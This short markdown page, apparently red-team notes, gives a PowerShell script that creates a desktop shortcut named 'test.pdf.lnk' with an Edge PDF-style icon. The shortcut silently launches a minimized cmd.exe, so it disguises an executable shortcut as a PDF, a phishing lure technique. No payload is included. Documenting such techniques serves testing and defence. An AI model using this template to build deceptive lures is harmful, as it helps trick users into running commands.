---
description: Powershell Script to Generate a LNK file
---

# LNK Script

`$path = "$([Environment]::GetFolderPath('Desktop'))\test.pdf.lnk"` \
`$wshell = New-Object -ComObject Wscript.Shell` \
`$shortcut = $wshell.CreateShortcut($path)` \
`$shortcut.IconLocation = "%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe,13"` \
`$shortcut.TargetPath = "cmd.exe"` \
`$shortcut.WorkingDirectory = ""` \
`$shortcut.Description = "PDF"` \
`$shortcut.WindowStyle = 7` \
`$shortcut.Save()`
